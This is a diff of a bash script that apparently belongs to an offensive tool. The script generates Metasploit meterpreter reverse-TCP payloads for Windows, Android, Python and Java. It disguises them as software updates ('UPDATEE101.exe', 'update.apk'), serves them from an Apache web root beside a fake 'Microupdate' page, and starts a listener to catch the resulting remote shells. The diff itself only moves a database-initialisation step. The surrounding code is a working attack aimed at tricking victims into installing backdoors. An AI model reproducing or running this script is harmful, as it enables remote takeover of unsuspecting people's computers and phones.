@@ -37,6 +37,7 @@ If you do not want to use the program, please press Ctrl+C to exit.
 '
 
 service postgresql start
+bash metastart.sh
 
 exe='1'
 apk='2'
@@ -48,7 +49,6 @@ read x
 
 # 1
 if [ "$x" == "$exe" ]; then 
-msfdb init
 msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp lhost=$ip lport=4444 -b "\x00" -f exe > UPDATEE101.exe
 	mv UPDATEE101.exe /var/www/html
 	cp -avr shimazu_module/Microupdate/* /var/www/html
@@ -58,7 +58,6 @@ msfconsole -q -x " use exploit/multi/handler; set payload windows/meterpreter/re
 
 # 2
 elif [ "$x" == "$apk" ]; then                          
-msfdb init
 msfvenom -p android/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/Desktop/update.apk
 	mv /root/Desktop/update.apk /var/www/html
 	systemctl start apache2.service
@@ -67,7 +66,6 @@ msfconsole -q -x " use exploit/multi/handler; set payload android/meterpreter/re
 
 # 3
 elif [ "$x" == "$py" ]; then                       
-msfdb init
 msfvenom -p python/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/Desktop/update.py
         cd /root/Desktop/
 	tar -czvf update.tar.gz update.py
@@ -79,7 +77,6 @@ msfconsole -q -x " use exploit/multi/handler; set payload python/meterpreter/rev
 
 # 4
 elif [ "$x" == "$jar" ]; then                        
-msfdb init
 msfvenom -p java/meterpreter/reverse_tcp lhost=$ip lport=4444 -f jar > /root/Desktop/update.jar
 	mv /root/Desktop/update.jar /var/www/html
 	systemctl start apache2.service
